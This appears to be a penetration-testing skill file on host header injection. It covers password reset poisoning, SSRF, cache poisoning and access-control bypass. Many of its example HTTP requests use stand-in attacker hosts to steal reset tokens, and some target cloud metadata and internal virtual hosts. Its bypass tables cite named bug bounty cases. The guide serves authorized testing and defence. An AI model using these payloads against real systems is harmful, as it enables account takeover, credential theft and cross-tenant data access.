---
name: host-header-injection
description: Host header injection testing covering password reset poisoning, SSRF via Host, web cache poisoning, and routing-based SSRF
depends_on: []
---

# Host Header Injection

Host header injection exploits applications that trust the Host header for URL generation, routing, and access control decisions. Focus on password reset poisoning, SSRF via Host header, web cache poisoning through Host manipulation, and routing-based SSRF in multi-tenant and reverse proxy environments.

## Attack Surface

**Host Header Usage**
- URL generation: absolute URLs in responses (links, redirects, emails)
- Routing: virtual host routing, multi-tenant resolution
- Access control: host-based restrictions (admin panel, internal features)
- Cache keys: Host header as part of cache key (or not)
- Security headers: CORS origin matching, CSRF referer validation

**Related Headers**
- `X-Forwarded-Host`: proxy-provided original host
- `X-Forwarded-For`: client IP (for completeness; host injection context)
- `X-Forwarded-Proto`: original protocol
- `X-Forwarded-Port`: original port
- `X-Original-Host`: alternative forwarded host header
- `Forwarded`: RFC 7239 standard header (host, for, proto, by)
- `X-Host`: non-standard host override

**Frameworks and Servers**
- Web frameworks: Django, Rails, Laravel, Express, Spring (each handles Host differently)
- Reverse proxies: nginx, Apache, HAProxy, Traefik
- CDN/edge: Cloudflare, Fastly, Akamai
- Application servers: Gunicorn, Puma, Tomcat, IIS

## High-Value Targets

- Password reset endpoints (Host in reset link email)
- Email verification / magic link endpoints
- OAuth/SSO redirect endpoints
- Admin panels with host-based access control
- Multi-tenant applications routing by Host
- Any page generating absolute URLs from Host header
- Webhook/callback URL generation

## Reconnaissance

**Host Header Behavior**
```
# Baseline request
GET / HTTP/1.1
Host: target.com

# Inject arbitrary host
GET / HTTP/1.1
Host: attacker.com

# If response differs (redirect, different content, error): host is processed
# If 200 with target content: host may be used only for URL generation
```

**Header Priority Testing**
```
# Test which header the application uses:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

GET / HTTP/1.1
Host: attacker.com
X-Forwarded-Host: target.com

GET / HTTP/1.1
Host: target.com
X-Host: attacker.com

GET / HTTP/1.1
Host: target.com
Forwarded: host=attacker.com
```

**Duplicate Host Header**
```
GET / HTTP/1.1
Host: target.com
Host: attacker.com
```
Some servers use the first, others the last, others reject the request. Reverse proxy may forward differently than the application processes.

## Key Vulnerabilities

### Password Reset Poisoning

**Attack Mechanism**
```
POST /password/reset HTTP/1.1
Host: attacker.com

email=victim@target.com
```
- Application generates reset link using Host header: `https://attacker.com/reset?token=TOKEN`
- Reset email sent to victim with the poisoned link
- Victim clicks link; token sent to attacker's server
- Attacker uses token to set new password

**Forwarded Header Variant**
```
POST /password/reset HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```
Application trusts X-Forwarded-Host for URL generation while Host is used for routing.

**Port Injection**
```
Host: target.com:@attacker.com
Host: target.com:443@attacker.com
```
URL parsing: `https://target.com:443@attacker.com/reset?token=TOKEN` sends request to attacker.com with target.com as userinfo.

**Absolute URL Override**
```
GET https://attacker.com/password/reset HTTP/1.1
Host: target.com
```
Some servers honor the absolute URL in the request line over the Host header.

### SSRF via Host Header

**Virtual Host Routing**
```
GET / HTTP/1.1
Host: internal-admin.target.local

# If reverse proxy routes by Host to different back-end:
# Attacker reaches internal virtual host through public endpoint
```

**Host-Based Service Discovery**
```
GET / HTTP/1.1
Host: localhost
Host: 127.0.0.1
Host: kubernetes.default.svc
Host: metadata.google.internal
```
If the application or proxy routes to a back-end service based on Host: attacker controls which internal service receives the request.

**DNS Rebinding via Host**
- Application validates Host on first request (resolves to allowed IP)
- DNS record changed to internal IP after validation
- Subsequent connections (keep-alive) reach internal service

### Web Cache Poisoning via Host

**Cache Key Without Host Normalization**
```
GET /static/app.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Application generates: var base = "https://attacker.com/api";
# Cache keys on Host: target.com + /static/app.js
# Cached response served to all visitors with attacker-controlled content
```

**Duplicate Host Poisoning**
```
GET / HTTP/1.1
Host: target.com
Host: attacker.com
```
- Cache keys on first Host (target.com)
- Application uses second Host (attacker.com) for URL generation
- Cached response contains attacker-controlled URLs

**See cache_poisoning.md for detailed cache exploitation techniques.**

### Routing-Based SSRF

**Reverse Proxy Path Confusion**
```
GET @attacker.com/ HTTP/1.1
Host: target.com

GET http://attacker.com/ HTTP/1.1
Host: target.com
```
Some reverse proxies interpret `@` or absolute URLs as the upstream destination.

**Back-End SSRF via Routing**
```
# If nginx routes: proxy_pass http://$host;
GET / HTTP/1.1
Host: 169.254.169.254

# nginx proxies to: http://169.254.169.254/
# Reaching cloud metadata endpoint
```

**SNI vs Host Mismatch**
- TLS SNI (Server Name Indication) may differ from Host header
- Front-end routes by SNI to correct back-end
- Back-end processes Host header for application logic
- Desync between routing (SNI) and application (Host)

### Authentication and Access Control Bypass

**Host-Based Admin Restrictions**
```
# Admin panel only accessible via internal hostname:
GET /admin HTTP/1.1
Host: admin.internal.target.com

# If reverse proxy doesn't validate Host, attacker bypasses restriction
```

**Multi-Tenant Isolation Bypass**
```
# Tenant A's application:
GET /api/users HTTP/1.1
Host: tenant-a.target.com

# Inject tenant B's host:
GET /api/users HTTP/1.1
Host: tenant-b.target.com
X-Forwarded-Host: tenant-a.target.com

# May return tenant B's data while appearing as tenant A
```

**CORS Origin Derivation** — If CORS validates by comparing Origin against Host, a manipulated Host changes what origins are considered "same-site."

## Defense-Bypass Pairs

| Defense | Bypass Technique | Real Example |
|---------|-----------------|--------------|
| `ALLOWED_HOSTS` validation (Django/Rails) | `X-Forwarded-Host` header bypasses Host validation — app trusts proxy header over Host | GitLab OAuth Jira SSRF via Rails `_url` helper trusting `Host`, $4,000 |
| Reverse proxy strips/validates Host | Duplicate Host headers — proxy uses first, app uses second (or vice versa) | Shopify themes.shopify.com cache poisoning via Host:port, $2,900 |
| Host allowlist on proxy | HTTP request smuggling injects `X-Forwarded-Host` in smuggled request that bypasses proxy validation | Basecamp HRS + XFH cache poisoning, $1,700 |
| DNS restriction (internal subdomain has no public A record) | Send request to public IP with `Host: internal.target.com` — routing layer serves internal vhost | Urban Company internal subdomain access via Host header, $500 |
| Port stripping on Host | `Host: target.com:@attacker.com` — URL parser treats `target.com:` as userinfo, `attacker.com` as actual host | Periscope TV ATO via OAuth callback Host injection, $7,560 |
| Single Host validation (reject non-matching) | Absolute URL in request line: `GET http://attacker.com/ HTTP/1.1` with valid `Host: target.com` — some servers honor request-line URL over Host | Apache/nginx request-line absolute URL override |
| CDN normalizes Host before cache key | Bare CR (`\r`) after HTTP method — CDN cache key ignores bare CR but backend treats `GET\r` as unknown method, returns 501 cached via negative caching | Google Cloud CDN cache poisoning via bare CR, $500,000 |
| SSR framework handles relative URLs automatically | Framework reads `Host` header to construct base URL for server-side fetches — `Host: attacker.com` makes SSR fetch from attacker's server | Angular Universal SSRF via `useAbsoluteUrl`, $500,000 |

## Chain Patterns

| Base Finding | Chain With | Combined Impact | Example |
|--------------|-----------|----------------|---------|
| Host header reflected in password reset email | Social engineering (victim clicks link) | Full ATO — reset token sent to attacker's server | Periscope TV OAuth Host injection ATO, $7,560 |
| `X-Forwarded-Host` reflected in HTML (canonical URL, base href) | CDN caching response without XFH in cache key | Stored XSS via cache poisoning — all visitors get attacker-controlled URLs | Shopify themes.shopify.com cache poison DoS, $2,900 |
| Host header controls SSR base URL | Cloud metadata SSRF (169.254.169.254) via redirect-following | IAM credential theft, full cloud account takeover | Angular Universal SSR SSRF, $500,000 |
| HTTP request smuggling (TE.TE desync) | `X-Forwarded-Host` in smuggled request + front-end cache | Persistent off-site redirect cached for all users, credential harvesting | Basecamp HRS cache poisoning, $1,700 |
| Host header used by Rails `_url` helpers | Outbound HTTP call using helper-generated URL + `allow_local_requests: true` | Unauthenticated blind SSRF to internal services and cloud metadata | GitLab Jira OAuth SSRF, $4,000 |
| Host header controls short-URL generation | Branded short domain (rsg.ms) redirects to attacker-controlled lookalike | Phishing via trusted short domain with attacker-controlled destination | Rockstar Games open redirect via Host, $300 |
| Non-resolving internal subdomain discovered via CT/GitHub | Host header routing to internal vhost through public ingress IP | Access to admin panels, monitoring dashboards, internal APIs | Urban Company internal subdomain access, $500 |
| Bare CR in HTTP method line forwarded by LB | Backend returns 501 for unknown method + negative caching enabled on CDN | Persistent DoS — legitimate URL returns cached 501 for all users | Google Cloud CDN bare CR poisoning, $500,000 |

## Password Reset Poisoning Matrix

| Framework | Header Used for URL Generation | Bypass When Validated | Impact |
|-----------|-------------------------------|----------------------|--------|
| Django | `request.META['HTTP_HOST']` via `build_absolute_uri()` | `X-Forwarded-Host` when `USE_X_FORWARDED_HOST=True` (common behind proxy) | Reset link points to attacker domain |
| Rails | `request.host` via `_url` helpers | `X-Forwarded-Host` trusted by default behind proxies; slash injection in Host (`attacker.com/target.com`) | Reset link + SSRF when used in outbound calls |
| Laravel | `$request->getHost()` from Symfony HttpFoundation | `X-Forwarded-Host` when trusted proxies configured; `Forwarded: host=attacker.com` | Reset/verification email link poisoning |
| Express/Node | `req.headers.host` or `req.hostname` (trusts `X-Forwarded-Host` when `trust proxy` enabled) | Duplicate Host headers — Express uses first occurrence | Reset link, OAuth callback URL poisoning |
| Spring Boot | `request.getServerName()` from `Host` header | `X-Forwarded-Host` via `ForwardedHeaderFilter` (enabled by default in Spring Boot 2+) | Email link, redirect URL poisoning |
| PHP (raw) | `$_SERVER['HTTP_HOST']` — raw client value, no validation | No framework validation to bypass — always attacker-controlled unless app explicitly checks | Universal — any URL built from `HTTP_HOST` |
| ASP.NET | `Request.Host` from `Host` header | `X-Original-Host` / `X-Forwarded-Host` when behind IIS ARR or Azure Front Door | Reset email, redirect URL poisoning |
| Angular Universal (SSR) | `Host` header via `useAbsoluteUrl` option for server-side fetches | N/A — framework always trusts Host for outbound URL construction | SSRF from server-side rendering ($500,000) |

## Header Precedence Matrix

| Server/Proxy | Headers Checked (priority order) | Override Technique |
|--------------|--------------------------------|-------------------|
| nginx (`$host`) | `Host` header (lowercase, no port) | `X-Forwarded-Host` if explicitly proxied via `proxy_set_header`; duplicate Host (some versions use last) |
| nginx (`$http_host`) | Raw `Host` header with port | Port injection: `Host: target.com:@attacker.com` |
| Apache (`UseCanonicalName Off`) | `Host` header → `SERVER_NAME` | Arbitrary Host accepted; first virtual host match on mismatch |
| HAProxy | `Host` header for routing; passes `X-Forwarded-Host` from client if not stripped | Inject `X-Forwarded-Host` directly — HAProxy does not strip by default |
| Cloudflare | Validates `Host` against configured origins; sets `CF-Connecting-IP` | Bypass via `X-Forwarded-Host` to origin if origin trusts it; duplicate Host headers |
| Fastly/Varnish | `Host` in cache key; `X-Forwarded-Host` forwarded if set by VCL | Unkeyed `X-Forwarded-Host` reflected by origin = cache poisoning vector |
| AWS ALB/CloudFront | `Host` forwarded to origin; `X-Forwarded-Host` not set by default | Origin trusting `X-Forwarded-Host` from client when ALB does not strip it |
| GCP Classic LB | `Host` forwarded; bare CR in method not rejected | Bare CR after method for cache key confusion ($500,000); `Host` misrouting to internal backends |

## Bypass Techniques

- Subdomain injection: `Host: attacker.target.com` when wildcard virtual hosts exist
- Port injection: `Host: target.com:@evil.com` (userinfo parsing)
- Absolute URL in request line: `GET http://evil.com/ HTTP/1.1` with legitimate Host header
- Tab/space injection: `Host: target.com\tattacker.com` (whitespace splitting)
- Connection-state attacks: legitimate Host on first request, malicious on second (keep-alive)
- Slash in Host: `Host: attacker.com/target.com` — URL construction becomes `https://attacker.com/target.com/path` (Periscope ATO, $7,560)
- Double URL encoding in redirect params: `%252%0DE` decodes across two layers to bypass path prefix checks (Meta FXAuth, $30,000)
- RFC-forbidden bytes: bare CR (`\r`) after HTTP method — forwarded by some LBs, triggers 501 on backends, poisons CDN negative cache ($500,000)

## Testing Methodology

1. **Baseline** - Document normal Host header behavior, URL generation, and routing
2. **Host manipulation** - Test arbitrary Host, duplicate Host, X-Forwarded-Host overrides
3. **Password reset** - Test all reset/verification email flows with manipulated Host
4. **SSRF probing** - Test Host values targeting internal services, metadata endpoints, localhost
5. **Cache interaction** - Test Host manipulation on cached responses (see cache_poisoning.md)
6. **Virtual host routing** - Enumerate internal virtual hosts accessible via Host manipulation
7. **Multi-tenant** - Test tenant isolation by swapping Host values between tenants
8. **Email inspection** - Check all generated emails for Host-derived URLs
9. **Framework URL helpers** - Grep source for `_url`/`build_absolute_uri`/`req.hostname` used in outbound HTTP calls — each is an SSRF candidate

## Validation

1. Password reset poisoning: reset email contains attacker-controlled domain in the reset link
2. SSRF: internal service response returned via Host-based routing manipulation
3. Cache poisoning: cached response contains Host-derived attacker-controlled content
4. Access control bypass: restricted endpoint accessible via Host manipulation
5. Multi-tenant isolation: data from tenant B accessible while authenticated as tenant A

## False Positives

- Application uses hardcoded domain for URL generation (ignores Host header)
- Reverse proxy normalizes Host before forwarding (strips port, validates against allowlist)
- ALLOWED_HOSTS validation rejecting unknown hosts (Django, Rails)
- CDN validating Host against configured origins
- Web server configured with explicit ServerName (Apache) or server_name (nginx)

## Impact

- Account takeover via password reset token theft
- SSRF reaching cloud metadata, internal services, or administrative interfaces
- Web cache poisoning affecting all users (stored XSS, redirect hijacking)
- Multi-tenant data leakage or cross-tenant access
- Phishing via legitimate-looking emails with attacker-controlled links

## Pro Tips

1. Password reset poisoning is the most common and highest-impact Host header finding
2. Always test both Host and X-Forwarded-Host; many applications only check one
3. Inspect ALL emails generated by the application, not just password reset — invitation links, verification emails, "view in browser" links, unsubscribe links all use Host-derived URLs
4. Duplicate Host headers are often the bypass when single Host injection is blocked
5. Use a DNS-logging service (OAST) to detect blind SSRF via Host
6. Port injection (`Host: target.com:@evil.com`) exploits URL parser differences — the browser sends traffic to `evil.com` while displaying `target.com` in the URL bar
7. Chain Host injection with cache poisoning for maximum impact (see cache_poisoning.md) — a single poisoned request can serve attacker content to all visitors for the cache TTL
8. For any SSR framework (Angular Universal, Next.js, Nuxt, SvelteKit), test whether `Host` header controls server-side fetch base URL — this is a $500k bug class
9. After finding Host reflection in responses, always check if the response is cached — if `X-Cache: HIT` appears, you have cache poisoning, not just reflected injection
10. When testing Rails apps, grep for `_url` helpers used in `HTTP.get`/`HTTP.post` calls — these use `request.host` and become SSRF gadgets (GitLab pattern, $4,000)
11. For internal subdomain access, enumerate non-resolving subdomains via certificate transparency logs and GitHub code search, then test each via Host header against the public IP
12. Test keep-alive connection state: send legitimate Host on first request, malicious Host on second request over same connection — some proxies only validate the first request's Host

## Summary

Host header injection exploits trust in a client-controlled header for URL generation, routing, and access control. The attack surface spans password reset flows, internal routing, cache behavior, and multi-tenant isolation, with impact ranging from phishing to full account takeover and SSRF.
